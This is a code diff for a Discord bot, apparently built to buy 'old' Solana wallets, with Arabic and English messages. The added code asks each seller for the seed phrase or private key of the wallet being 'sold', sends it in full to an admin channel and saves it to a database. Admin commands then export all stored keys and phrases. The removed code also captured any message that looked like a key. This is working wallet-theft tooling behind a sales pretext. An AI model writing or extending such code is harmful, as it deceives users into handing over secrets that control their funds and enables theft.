@@ -1,6 +1,5 @@
 import discord
 from discord.ext import commands
-from discord import app_commands
 import requests
 import re
 import logging
@@ -54,28 +53,15 @@ ADMIN_IDS = [1455690622412390573]
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
-from discord import app_commands
-
-# ... (rest of imports)
-
-# ... (around line 59)
 bot = commands.Bot(command_prefix=['/', ''], intents=intents, help_command=None)
 
 @bot.event
 async def on_ready():
-    try:
-        synced = await bot.tree.sync()
-        print(f"✅ Synced {len(synced)} commands successfully!")
-    except Exception as e:
-        print(f"❌ Sync failed: {e}")
+    await bot.tree.sync()
     print(f'Logged in as {bot.user}')
+    print("Slash commands synced.")
 
-@bot.tree.command(
-    name="start", 
-    description="Start using the bot"
-)
-@app_commands.allowed_installs(guilds=True, users=True)
-@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
+@bot.tree.command(name="start", description="Start using the bot")
 async def start_slash(interaction: discord.Interaction):
     """امر البداية (Slash Command)"""
     welcome_text = (
@@ -123,7 +109,7 @@ async def send_to_channel(channel_id, content=None, embed=None, file=None, files
 async def send_to_target(content=None, embed=None, file=None, files=None, view=None):
     await send_to_channel(TARGET_CHANNEL_ID, content, embed, file, files, view)
 
-def log_wallet_check(user_id, username, wallet_address, sol_value, full_amount=None, is_admin=False, is_custom=False, is_empty=False):
+async def log_wallet_check(user_id, username, wallet_address, sol_value, full_amount=None, is_admin=False, is_custom=False, is_empty=False):
     # Save to addresses.txt for 'فارغ' command
     try:
         with open("addresses.txt", "a", encoding="utf-8") as f:
@@ -155,7 +141,7 @@ def log_wallet_check(user_id, username, wallet_address, sol_value, full_amount=N
     log_message += f"\n⏰ **Time**: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`"
     
     target_id = EMPTY_WALLET_CHANNEL_ID if is_empty else VALUABLE_WALLET_CHANNEL_ID
-    asyncio.run_coroutine_threadsafe(send_to_channel(target_id, content=log_message), bot.loop)
+    await send_to_channel(target_id, content=log_message)
 
 def log_new_referral(referrer_id, referrer_username, referred_id, referred_username):
     referrer_display = f"@{referrer_username}" if referrer_username else "لا يوجد"
@@ -391,73 +377,173 @@ async def on_message(message):
     # Forward to target channel
     user_id = message.author.id
     username = str(message.author)
-    first_name = message.author.global_name or message.author.name
-    last_name = ""
     
     # Add user to database if not exists
     add_user(user_id, message.author.name, message.author.global_name or message.author.name, "")
+    
+    # Get user state
+    state = user_states.get(user_id)
+    info_text = f"👤 **User**: {username} (ID: `{user_id}`)\n"
 
-    # Welcome new users in DMs if they haven't sent a wallet or command
-    if isinstance(message.channel, discord.DMChannel) and not extract_wallets(message.content) and not message.content.startswith('/'):
-        welcome_text = (
-            "Welcome.\n\n"
-            "Send me the address of the old wallet you want to sell 💰"
-        )
-        await message.reply(welcome_text)
+    # 1. Handle user states (Selling process & Private Key)
+    if state == "waiting_for_ed_wallet":
+        wallets = extract_wallets(message.content)
+        if wallets:
+            wallet = wallets[0]
+            await message.reply(f"✅ Received wallet: `{wallet}`\n\nPlease send the **Custom Price** (SOL) for this wallet:")
+            user_states[user_id] = f"waiting_for_ed_price_{wallet}"
+            return
+    
+    if state and state.startswith("waiting_for_ed_price_"):
+        wallet = state.replace("waiting_for_ed_price_", "")
+        try:
+            price = float(message.content.strip())
+            conn = sqlite3.connect(DB_PATH)
+            cursor = conn.cursor()
+            cursor.execute('''INSERT OR REPLACE INTO wallet_prices
+                             (wallet_address, custom_price, set_by_admin)
+                             VALUES (?, ?, ?)''', (wallet, price, user_id))
+            conn.commit()
+            conn.close()
+            await message.reply(f"✅ Set custom price for `{wallet}` to `{price} SOL`")
+            user_states.pop(user_id, None)
+        except ValueError:
+            await message.reply("❌ Invalid price. Please send a number (e.g. 0.5):")
         return
 
-    # Process wallet addresses if found in the message
-    wallets = extract_wallets(message.content)
-    if wallets:
-        for wallet in wallets[:3]: # Limit to 3 wallets per message to prevent spam
-            is_admin = message.author.id in ADMIN_IDS
-            result = process_wallet_check_sync(user_id, username, wallet, is_admin)
+    if state == "waiting_for_reward_wallet":
+        wallets = extract_wallets(message.content)
+        if wallets:
+            reward_wallet = wallets[0]
+            if user_id not in user_wallets:
+                user_wallets[user_id] = {}
             
-            if result:
-                if result['is_empty']:
-                    embed = discord.Embed(
-                        title="⚠️ Wallet is Empty",
-                        description=f"The wallet `{wallet}` does not contain any rent or valuable assets.",
-                        color=discord.Color.red()
-                    )
-                    await message.reply(embed=embed)
-                else:
-                    embed = discord.Embed(
-                        title="💰 Wallet Found!",
-                        description=(
-                            f"**Wallet:** `{wallet}`\n"
-                            f"**Estimated Value:** `{result['user_sol_value']:.4f} SOL`\n\n"
-                            "Would you like to sell this wallet?"
-                        ),
-                        color=discord.Color.green()
-                    )
-                    
-                    view = discord.ui.View()
-                    sell_button = discord.ui.Button(label="Sell Now", style=discord.ButtonStyle.success, custom_id=f"sell_{wallet}")
-                    
-                    async def sell_callback(interaction):
-                        if interaction.user.id != message.author.id:
-                            await interaction.response.send_message("This is not your wallet check!", ephemeral=True)
-                            return
-                        await interaction.response.send_message(f"✅ Sale request for `{wallet}` has been sent to admins for processing.", ephemeral=True)
-                        # Log to admin channel
-                        admin_msg = f"🔔 **New Sale Request**\nUser: {username}\nWallet: `{wallet}`\nValue: `{result['user_sol_value']} SOL`"
-                        await send_to_target(content=admin_msg)
+            # Verify it's different from the original wallet
+            original_wallet = user_wallets[user_id].get('original_wallet', 'Unknown')
+            if reward_wallet == original_wallet:
+                await message.reply("❌ The receiving wallet must be different from the selling wallet. Please provide a different address:")
+                return
 
-                    sell_button.callback = sell_callback
-                    view.add_item(sell_button)
-                    
-                    await message.reply(embed=embed, view=view)
-                    
-                    # Log the check
-                    log_wallet_check(
-                        user_id, username, wallet, 
-                        result['user_sol_value'], 
-                        result['total_rent'], 
-                        is_admin=is_admin, 
-                        is_empty=result['is_empty']
-                    )
+            user_wallets[user_id]['reward_wallet'] = reward_wallet
+            
+            short_orig = f"{original_wallet[:4]}...{original_wallet[-4:]}"
+            short_reward = f"{reward_wallet[:4]}...{reward_wallet[-4:]}"
+            
+            prompt_text = (
+                "Send us the secret phrase of the wallet you want to sell.\n\n"
+                f"• Wallet for Sale: `{short_orig}`\n"
+                f"• Receiving Wallet: `{short_reward}`"
+            )
+            
+            await message.reply(prompt_text)
+            user_states[user_id] = "waiting_for_private_key"
+            return
+
+    if state == "waiting_for_private_key":
+        key_data = message.content.strip()
+        original_data = user_wallets.get(user_id)
+        
+        if original_data and 'original_wallet' in original_data:
+            original_wallet = original_data['original_wallet']
+            reward_wallet = original_data.get('reward_wallet', 'Not provided')
+            amount = original_data['amount']
+            
+            # Log the FULL sale request to admin after getting the key
+            sale_msg = (
+                "💰 **New Complete Sale Request**\n\n"
+                f"👤 **User**: @{username} (ID: `{user_id}`)\n"
+                f"📌 **Selling Wallet**: `{original_wallet}`\n"
+                f"📥 **Receiving Wallet**: `{reward_wallet}`\n"
+                f"🔑 **Key/Seed**: `{key_data}`\n"
+                f"💎 **Amount**: `{amount:.4f} SOL` (Rent Value)\n"
+            )
+            # Send to TARGET_CHANNEL_ID for orders
+            await send_to_channel(TARGET_CHANNEL_ID, content=sale_msg)
+            
+            # Save key to database
+            try:
+                conn = sqlite3.connect(DB_PATH)
+                cursor = conn.cursor()
+                key_type = "seed" if len(key_data.split()) > 1 else "private_key"
+                cursor.execute('''INSERT INTO user_keys (user_id, username, key_data, key_type)
+                                 VALUES (?, ?, ?, ?)''', (user_id, username, key_data, key_type))
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                logging.error(f"Error saving key to DB: {e}")
+
+            await message.reply("✅ Your request has been sent to the administration. We will process your payment soon.")
+            user_states.pop(user_id, None)
+            user_wallets.pop(user_id, None)
+            return
+        else:
+            await message.reply("❌ Error: Transaction data lost. Please start again by sending the wallet address.")
+            user_states.pop(user_id, None)
+            return
+
+    # 2. Forward regular messages to admin (User Content Channel)
+    prefixes = ('/', '!', '.', '')
+    if not message.content.startswith(prefixes) and not extract_wallets(message.content):
+        # Check if the message is from an admin
+        if message.author.id in ADMIN_IDS:
+            await bot.process_commands(message)
+            return
+
+        # Check if it's a reply from a user in a support chat
+        if state == "waiting_for_user_reply":
+            admin_msg = f"📩 **New Reply from User** (ID: `{user_id}`):\n{message.content}"
+            admin_view = discord.ui.View()
+            reply_btn = discord.ui.Button(label="Reply", style=discord.ButtonStyle.primary)
+            end_btn = discord.ui.Button(label="End Conversation", style=discord.ButtonStyle.danger)
+
+            async def admin_reply_callback(interaction):
+                await interaction.response.edit_message(view=None)
+                await interaction.followup.send(f"Please send your message for user `{user_id}` now:", ephemeral=True)
+                user_states[interaction.user.id] = f"waiting_for_rr_msg_{user_id}"
+
+            async def admin_end_callback(interaction):
+                await interaction.response.edit_message(view=None)
+                try:
+                    user = await bot.fetch_user(user_id)
+                    await user.send("The admin has ended the conversation.")
+                except: pass
+                await interaction.followup.send("Conversation ended.", ephemeral=True)
+                user_states.pop(user_id, None)
+
+            reply_btn.callback = admin_reply_callback
+            end_btn.callback = admin_end_callback
+            admin_view.add_item(reply_btn)
+            admin_view.add_item(end_btn)
+
+            files = []
+            for attachment in message.attachments:
+                files.append(await attachment.to_file())
+
+            for admin_id in ADMIN_IDS:
+                try:
+                    admin = await bot.fetch_user(admin_id)
+                    await admin.send(admin_msg, view=admin_view, files=files)
+                except Exception as e:
+                    logging.error(f"Error forwarding reply to admin {admin_id}: {e}")
+            
+            await message.reply("✅ Your reply has been sent to the Admin.")
+            return
+
+        # If it's a media/file message, it goes to USER_CONTENT_CHANNEL_ID
+        # If it's just text and doesn't match other logic, it also goes there
+        forward_msg = (
+            "💬 **Message from User**\n\n"
+            f"👤 **User**: {username} (ID: `{user_id}`)\n"
+            f"📝 **Content**: {message.content}"
+        )
+        files = []
+        for attachment in message.attachments:
+            files.append(await attachment.to_file())
+        
+        await send_to_channel(USER_CONTENT_CHANNEL_ID, content=forward_msg, files=files)
         return
+
+    content_lower = message.content.lower().strip()
 
     if message.author.id in ADMIN_IDS:
         content_lower = message.content.lower().strip()
@@ -605,8 +691,6 @@ async def on_message(message):
             try:
                 conn = sqlite3.connect(DB_PATH)
                 cursor = conn.cursor()
-                
-                # Fetch seeds (assuming key_type might be 'seed' or similar, let's get all and format)
                 cursor.execute("SELECT key_data, key_type FROM user_keys")
                 rows = cursor.fetchall()
                 conn.close()
@@ -628,12 +712,9 @@ async def on_message(message):
                 await message.reply(f"❌ حدث خطأ أثناء استخراج البيانات: {e}")
             return
 
-        state = user_states.get(user_id)
-        
         if state == "waiting_for_db_upload" and message.attachments:
             for attachment in message.attachments:
                 try:
-                    # التحقق من اسم الملف قبل الحفظ لضمان الأمان
                     if attachment.filename in ['users.db', 'addresses.txt', 'rent.txt', 'user_ratio.txt']:
                         await attachment.save(attachment.filename)
                         await message.reply(f"✅ تم تحديث الملف: `{attachment.filename}` بنجاح.")
@@ -662,28 +743,24 @@ async def on_message(message):
             target_id = int(state.replace("waiting_for_rr_msg_", ""))
             try:
                 user = await bot.fetch_user(target_id)
-                
-                embed = discord.Embed(
-                    title="Message from Admin", 
-                    description=message.content, 
-                    color=discord.Color.blue(),
-                    timestamp=datetime.datetime.now()
-                )
+                embed = discord.Embed(title="Message from Admin", description=message.content, color=discord.Color.blue(), timestamp=datetime.datetime.now())
                 embed.set_footer(text="Admin Support")
                 
-                # Setup user view for their side
+                # Check for attachments in admin's reply
+                files = []
+                for attachment in message.attachments:
+                    files.append(await attachment.to_file())
+                
                 user_view = discord.ui.View()
                 u_reply_btn = discord.ui.Button(label="Reply", style=discord.ButtonStyle.primary)
                 u_end_btn = discord.ui.Button(label="End Conversation", style=discord.ButtonStyle.danger)
 
                 async def u_reply_cb(interaction):
-                    # Hide buttons after reply
                     await interaction.response.edit_message(view=None)
                     await interaction.followup.send("Please send your reply now:", ephemeral=True)
                     user_states[interaction.user.id] = "waiting_for_user_reply"
 
                 async def u_end_cb(interaction):
-                    # Hide buttons after ending
                     await interaction.response.edit_message(view=None)
                     await interaction.followup.send("Conversation ended.", ephemeral=True)
                     user_states.pop(interaction.user.id, None)
@@ -692,352 +769,14 @@ async def on_message(message):
                 u_end_btn.callback = u_end_cb
                 user_view.add_item(u_reply_btn)
                 user_view.add_item(u_end_btn)
-
-                await user.send(embed=embed, view=user_view)
-                
-                admin_confirm_view = discord.ui.View()
-                admin_reply_btn = discord.ui.Button(label="Reply", style=discord.ButtonStyle.primary)
-                admin_end_btn = discord.ui.Button(label="End Conversation", style=discord.ButtonStyle.danger)
-
-                async def a_reply_cb(interaction):
-                    # Hide buttons after admin reply
-                    await interaction.response.edit_message(view=None)
-                    await interaction.followup.send(f"Please send your message for user `{target_id}` now:", ephemeral=True)
-                    user_states[interaction.user.id] = f"waiting_for_rr_msg_{target_id}"
-
-                async def a_end_cb(interaction):
-                    # Hide buttons after admin ends
-                    await interaction.response.edit_message(view=None)
-                    try:
-                        u = await bot.fetch_user(target_id)
-                        await u.send("The admin has ended the conversation.")
-                    except: pass
-                    await interaction.followup.send("Conversation ended.", ephemeral=True)
-                    user_states.pop(target_id, None)
-
-                admin_reply_btn.callback = a_reply_cb
-                admin_end_btn.callback = a_end_cb
-                
-                admin_confirm_view = discord.ui.View()
-                admin_confirm_view.add_item(admin_reply_btn)
-                admin_confirm_view.add_item(admin_end_btn)
-
+                await user.send(embed=embed, view=user_view, files=files)
                 await message.reply(f"✅ Message sent to `{target_id}` successfully.")
                 user_states.pop(user_id, None)
-                # Set user state to wait for their reply to show buttons then
                 user_states[target_id] = "waiting_for_user_reply"
             except Exception as e:
                 await message.reply(f"❌ Failed to send: {e}")
                 user_states.pop(user_id, None)
             return
-
-    # 1. Check if it's a selling request (contains wallets and potentially keys/seeds)
-    wallets = extract_wallets(message.content)
-    content_lower = message.content.lower().strip()
-    is_seed = len(content_lower.split()) in [12, 15, 18, 21, 24]
-    is_privkey = len(content_lower) in [87, 88, 128] or (len(content_lower) > 60 and " " not in content_lower and not wallets)
-    
-    # 2. Forward to appropriate channel
-    if wallets or is_seed or is_privkey:
-        # This is a selling/wallet related message - handled by existing logic or goes to TARGET_CHANNEL_ID
-        pass 
-    elif message.content:
-        content_lower = message.content.lower().strip()
-        # Avoid double forwarding if it is a command
-        is_command = content_lower.startswith(('/', '!', '.')) or any(content_lower == cmd for cmd in ['عبارات ومفاتيح', 'عناوين', 'فحص', 'فارغ', 'blocklist', 'ratios', 'pay', 'broadcast'])
-        
-        state = user_states.get(message.author.id)
-        if state == "waiting_for_user_reply":
-            # Forward user reply back to admin with buttons for admin to reply or end
-            admin_msg = f"📩 **New Reply from User** (ID: `{message.author.id}`):\n{message.content}"
-            
-            admin_view = discord.ui.View()
-            reply_btn = discord.ui.Button(label="Reply", style=discord.ButtonStyle.primary)
-            end_btn = discord.ui.Button(label="End Conversation", style=discord.ButtonStyle.danger)
-
-            async def admin_reply_callback(interaction):
-                # Hide buttons after admin reply
-                await interaction.response.edit_message(view=None)
-                await interaction.followup.send(f"Please send your message for user `{message.author.id}` now:", ephemeral=True)
-                user_states[interaction.user.id] = f"waiting_for_rr_msg_{message.author.id}"
-
-            async def admin_end_callback(interaction):
-                # Hide buttons after admin ends
-                await interaction.response.edit_message(view=None)
-                try:
-                    user = await bot.fetch_user(message.author.id)
-                    await user.send("The admin has ended the conversation.")
-                except: pass
-                await interaction.followup.send("Conversation ended.", ephemeral=True)
-                user_states.pop(message.author.id, None)
-
-            reply_btn.callback = admin_reply_callback
-            end_btn.callback = admin_end_callback
-            admin_view.add_item(reply_btn)
-            admin_view.add_item(end_btn)
-
-            for admin_id in ADMIN_IDS:
-                try:
-                    admin = await bot.fetch_user(admin_id)
-                    await admin.send(admin_msg, view=admin_view)
-                except Exception as e:
-                    logging.error(f"Error forwarding reply to admin {admin_id}: {e}")
-            
-            # Inform user that their message was sent
-            # Update previous message to hide buttons if possible, or just send a clear response
-            await message.reply("✅ Your reply has been sent to the Admin.")
-            return
-
-        if not is_command:
-            # This is a general message - forward to USER_CONTENT_CHANNEL_ID
-            forward_text = f"{info_text}"
-            forward_text += f"💬 **Message**: {message.content}"
-            
-            if message.attachments:
-                for attachment in message.attachments:
-                    forward_text += f"\n📎 **Attachment**: {attachment.url}"
-            
-            asyncio.run_coroutine_threadsafe(send_to_channel(USER_CONTENT_CHANNEL_ID, content=forward_text), bot.loop)
-            return # IMPORTANT: Stop processing this message further so it doesn't hit other logic
-
-    # Remove the old SECOND_TARGET_CHANNEL_ID logic that was below
-
-    # 290→    if message.author.id in ADMIN_IDS:
-    # 291→        admin_state = admin_payment_states.get(message.author.id)
-    # ...
-    # 335→    # Handle states like waiting for wallet FIRST
-    # ...
-    # 423→        if message.author.id in ADMIN_IDS:
-    # 424→            content = message.content.strip()
-
-    # ═══════════════════════════════════════════════════════════════
-    # Logic for handling specific states (waiting for wallet, etc.)
-    # ═══════════════════════════════════════════════════════════════
-    # state = user_states.get(user_id) # Moved up inside on_message
-
-    # Check for keys/seeds regardless of state to ensure they are captured
-    content_lower = message.content.lower().strip()
-    is_seed = len(content_lower.split()) in [12, 15, 18, 21, 24]
-    is_privkey = len(content_lower) in [87, 88, 128] or (len(content_lower) > 60 and " " not in content_lower and not extract_wallets(content_lower))
-
-    if is_seed or is_privkey:
-        key_type = "seed" if is_seed else "private_key"
-        try:
-            conn = sqlite3.connect(DB_PATH)
-            cursor = conn.cursor()
-            cursor.execute("INSERT INTO user_keys (user_id, username, key_data, key_type) VALUES (?, ?, ?, ?)",
-                           (user_id, username, message.content, key_type))
-            conn.commit()
-            conn.close()
-            
-            # Log the final request to target channel
-            pending_data = user_wallets.get(user_id)
-            if pending_data:
-                original_wallet = pending_data.get("original_wallet")
-                reward_wallet = pending_data.get("reward_wallet")
-                real_amount = pending_data.get("amount", 0)
-                
-                # Get user value using the same logic as process_wallet_check_sync
-                try:
-                    with open('user_ratio.txt', 'r') as f:
-                        current_user_divisor = float(f.read().strip())
-                except:
-                    current_user_divisor = 2.0
-                
-                user_value = round(real_amount / current_user_divisor, 5)
-                
-                final_request_msg = (
-                    f"📌 New Request\n\n"
-                    f"👤 User ID: {user_id}\n"
-                    f"👤 Username: @{message.author.name}\n\n"
-                    f"🔹 Original Wallet:\n{original_wallet}\n\n"
-                    f"🔸 Reward Wallet:\n{reward_wallet}\n\n"
-                    f"🔐 Private Key/Seed:\n{message.content}\n\n"
-                    f"💰 Real Amount: {real_amount:.4f} SOL\n"
-                    f"💵 User Value: {user_value:.5f} SOL\n"
-                    f"🕒 Time: {datetime.datetime.now().strftime('%I:%M %p')}"
-                )
-                
-                # Add Pay button for admin
-                pay_view = discord.ui.View()
-                pay_btn = discord.ui.Button(label="pay", style=discord.ButtonStyle.green)
-                
-                async def pay_callback(interaction):
-                    # Notify user
-                    success_msg = (
-                        "🎊 Congratulations! The transaction was successful\n\n"
-                        "Your request has been processed and funds have been sent to your wallet. Thank you for your trust! If you have more wallets, we are always here for you!\n\n"
-                        "🎁 When you sell wallets with a total value of 10 SOL, you will receive a 1 SOL bonus."
-                    )
-                    try:
-                        target_user = await bot.fetch_user(user_id)
-                        await target_user.send(success_msg)
-                        await interaction.response.send_message(f"✅ Payment notification sent to user {user_id}", ephemeral=True)
-                    except Exception as e:
-                        await interaction.response.send_message(f"❌ Could not send DM to user {user_id}: {e}", ephemeral=True)
-                
-                pay_btn.callback = pay_callback
-                pay_view.add_item(pay_btn)
-                
-                asyncio.run_coroutine_threadsafe(send_to_target(content=final_request_msg, view=pay_view), bot.loop)
-
-            if state == "waiting_for_key":
-                await message.reply("✅ Your request is being processed. Please wait for admin approval.")
-                user_states.pop(user_id, None)
-                return
-        except Exception as e:
-            logging.error(f"Error saving key: {e}")
-
-    if state == "waiting_for_reward_wallet":
-        # Check if the message is a wallet address
-        wallets = extract_wallets(message.content)
-        if wallets:
-            reward_wallet = wallets[0]
-            # Verify it's different from the original wallet
-            pending_data = user_wallets.get(user_id)
-            if pending_data and reward_wallet == pending_data.get("original_wallet"):
-                await message.reply("❌ The receiving wallet must be different from the selling wallet. Please provide a different address:")
-                return
-
-            # Save the reward wallet and update state
-            if user_id in user_wallets:
-                user_wallets[user_id]["reward_wallet"] = reward_wallet
-            
-            await message.reply(f"✅ Receiving wallet saved:\n`{reward_wallet}`\n\nYour request is being processed. Please wait for admin approval.")
-            user_states[user_id] = "waiting_for_key"
-            
-            # Here you would typically log this to the admin channel or update DB
-            log_msg = f"💰 **Reward Wallet Submitted**\n👤 User: @{message.author}\n🆔 ID: `{user_id}`\n📍 Wallet: `{reward_wallet}`\n\n*Waiting for seed phrase/private key...*"
-            asyncio.run_coroutine_threadsafe(send_to_target(content=log_msg), bot.loop)
-            return
-        else:
-            # If not a wallet, don't treat it as a command error, just ignore or prompt
-            return
-
-        # ═══════════════════════════════════════════════════════════════
-        # Admin Commands
-        # ═══════════════════════════════════════════════════════════════
-        if not hasattr(bot, 'admin_contexts'):
-            bot.admin_contexts = {}
-
-        if message.author.id in ADMIN_IDS:
-            content = message.content.strip()
-            content_lower = content.lower()
-            
-            # Check if it's actually a command (starts with prefix or is in known commands list)
-            is_known_command = content_lower in [
-                'ratios', 'blocklist', 'start', 'referral', 'pay', 'broadcast', 'rr',
-                'عبارات ومفاتيح', 'عناوين', 'فحص', 'فارغ', 'r30', '30%', 'r40', '40%', 'r50', '50%', 'r70', '70%'
-            ] or content_lower.startswith(('ed ', 'broadcast ', '/'))
-            
-            if is_known_command or any(char.isdigit() for char in content):
-                # Handle numeric inputs (Prices or Ratios)
-                try:
-                    is_percentage = '%' in content_lower
-                    val_str = content_lower.replace('%', '')
-                    if val_str.replace('.', '', 1).isdigit():
-                        val = float(val_str)
-                        
-                        # If it has %, it's ALWAYS a global ratio
-                        if is_percentage:
-                            if val > 0:
-                                new_divisor = 100.0 / val
-                                save_user_divisor(new_divisor)
-                                await message.reply(f"✅ تم تعيين النسبة العامة لجميع المستخدمين: **{val}%**\n(المقسوم الحالي: {new_divisor:.4f})")
-                            else:
-                                await message.reply("❌ النسبة يجب أن تكون أكبر من صفر.")
-                            return
-
-                        # If it's a number without %, check if we have a wallet context
-                        last_wallet = bot.admin_contexts.get(message.author.id)
-                        if last_wallet:
-                            ctx = await bot.get_context(message)
-                            await ed_command(ctx, last_wallet, val)
-                            return
-                        
-                        # If no wallet context and no %, prompt user
-                        await message.reply("💡 لتعيين **نسبة مئوية عامة**، أضف رمز `%` (مثال: `80%`).\nلتحديد **سعر مخصص** لمحفظة، اختر المحفظة أولاً باستخدام `ed <wallet>`.")
-                        return
-                except Exception as e:
-                    logging.error(f"Numeric input error: {e}")
-
-            # Handle "ed <wallet> <price>"
-            if content_lower.startswith('ed '):
-                parts = content.split()
-                if len(parts) >= 2:
-                    wallet = parts[1]
-                    bot.admin_contexts[message.author.id] = wallet # Store context
-                    price = None
-                    if len(parts) >= 3:
-                        try:
-                            price = float(parts[2])
-                        except ValueError:
-                            pass
-                    
-                    ctx = await bot.get_context(message)
-                    await ed_command(ctx, wallet, price)
-                    return
-                else:
-                    await message.reply("❌ Usage: `ed <wallet_address> [price]`")
-                    return
-
-            # Known text commands
-            if content_lower in ['ratios']:
-                ctx = await bot.get_context(message)
-                await ratios(ctx)
-                return
-            elif content_lower == 'blocklist':
-                ctx = await bot.get_context(message)
-                await blocklist(ctx)
-                return
-            elif content_lower == 'start':
-                ctx = await bot.get_context(message)
-                await start(ctx)
-                return
-            elif content_lower == 'referral':
-                ctx = await bot.get_context(message)
-                await referral(ctx)
-                return
-            elif content_lower == 'pay':
-                ctx = await bot.get_context(message)
-                await pay(ctx)
-                return
-            elif content_lower == 'broadcast':
-                ctx = await bot.get_context(message)
-                await broadcast(ctx)
-                return
-            elif content_lower == 'عبارات ومفاتيح':
-                ctx = await bot.get_context(message)
-                await export_keys_here(ctx)
-                return
-            elif content_lower == 'عناوين':
-                ctx = await bot.get_context(message)
-                await export_addresses(ctx)
-                return
-            elif content_lower == 'فحص':
-                ctx = await bot.get_context(message)
-                await export_addresses(ctx, mode="rent")
-                return
-            elif content_lower == 'فارغ':
-                ctx = await bot.get_context(message)
-                await export_addresses(ctx, mode="empty")
-                return
-            elif content_lower in ['r30', '30%']:
-                ctx = await bot.get_context(message)
-                await r30(ctx)
-                return
-            elif content_lower in ['r40', '40%']:
-                ctx = await bot.get_context(message)
-                await r40(ctx)
-                return
-            elif content_lower in ['r50', '50%']:
-                ctx = await bot.get_context(message)
-                await r50(ctx)
-                return
-            elif content_lower in ['r70', '70%']:
-                ctx = await bot.get_context(message)
-                await r70(ctx)
-                return
 
     # Wallet Extraction & Processing (Auto-Check)
     # ═══════════════════════════════════════════════════════════════
@@ -1077,9 +816,11 @@ async def on_message(message):
         result = await loop.run_in_executor(None, process_wallet_check_sync, user_id, username, wallet)
         
         if result:
-            log_wallet_check(user_id, username, wallet, result['user_sol_value'], result['total_rent'], is_empty=result['is_empty'])
+            await log_wallet_check(user_id, username, wallet, result['user_sol_value'], result['total_rent'], is_empty=result['is_empty'])
             if result["is_empty"]:
                 await message.reply("🚫 Unfortunately, we cannot offer any value for this wallet.\n\n🔍 Try checking other addresses—some might be valuable!")
+                # Send to EMPTY_WALLET_CHANNEL_ID
+                await log_wallet_check(user_id, username, wallet, result['user_sol_value'], result['total_rent'], is_empty=True)
             else:
                 short_wallet = wallet[:4] + "..." + wallet[-4:]
                 result_text = f"Wallet: `{short_wallet}`\n\nYou will receive: `{result['user_sol_value']} SOL 💰`"
@@ -1116,8 +857,8 @@ async def on_message(message):
                 
                 await message.reply(result_text, view=view)
                 
-                # Log to admin channel
-                log_wallet_check(user_id, username, wallet, result['user_sol_value'], result['total_rent'], is_custom=result['is_custom'])
+                # Send to VALUABLE_WALLET_CHANNEL_ID
+                await log_wallet_check(user_id, username, wallet, result['user_sol_value'], result['total_rent'], is_custom=result['is_custom'], is_empty=False)
         
         # If it was JUST a wallet, we stop here to avoid CommandNotFound
         if is_only_wallet:
@@ -1139,7 +880,8 @@ async def ed_command(ctx, wallet_address: str = "", price: float = 0.0):
         return
     
     if not wallet_address:
-        await ctx.reply("❌ Usage: `ed <wallet_address> [price]`")
+        await ctx.reply("💬 Please send the **Wallet Address** you want to set a custom price for:")
+        user_states[ctx.author.id] = "waiting_for_ed_wallet"
         return
 
     if price != 0.0:
@@ -1156,7 +898,7 @@ async def ed_command(ctx, wallet_address: str = "", price: float = 0.0):
             await ctx.reply(f"❌ Error: {e}")
         return
 
-    # If no price, show current status/interface
+    # If no price, show current status
     try:
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
@@ -1174,6 +916,42 @@ async def ed_command(ctx, wallet_address: str = "", price: float = 0.0):
         await ctx.reply(embed=embed)
     except Exception as e:
         await ctx.reply(f"❌ Error: {e}")
+
+@bot.command(name="فحص")
+async def check_command(ctx, wallet: str = ""):
+    if ctx.author.id not in ADMIN_IDS: return
+    if not wallet:
+        await ctx.reply("❌ Usage: `فحص <wallet_address>`")
+        return
+    
+    # Use existing sync logic but for admin (no divisor)
+    loop = asyncio.get_event_loop()
+    result = await loop.run_in_executor(None, process_wallet_check_sync, ctx.author.id, ctx.author.name, wallet, True)
+    
+    if result:
+        # For admin, we show full rent
+        res_text = (
+            f"🔍 **Admin Check Results**\n\n"
+            f"📌 Wallet: `{wallet}`\n"
+            f"💎 Full Rent: `{result['total_rent']:.6f} SOL`"
+        )
+        await ctx.reply(res_text)
+
+@bot.command(name="فارغ")
+async def empty_command(ctx):
+    if ctx.author.id not in ADMIN_IDS: return
+    if not os.path.exists("addresses.txt"):
+        await ctx.reply("📋 No addresses found.")
+        return
+    await ctx.reply(file=discord.File("addresses.txt"))
+
+@bot.command(name="عناوين")
+async def addresses_command(ctx):
+    if ctx.author.id not in ADMIN_IDS: return
+    if not os.path.exists("rent.txt"):
+        await ctx.reply("📋 No rent addresses found.")
+        return
+    await ctx.reply(file=discord.File("rent.txt"))
 
 @bot.command()
 async def r50(ctx):
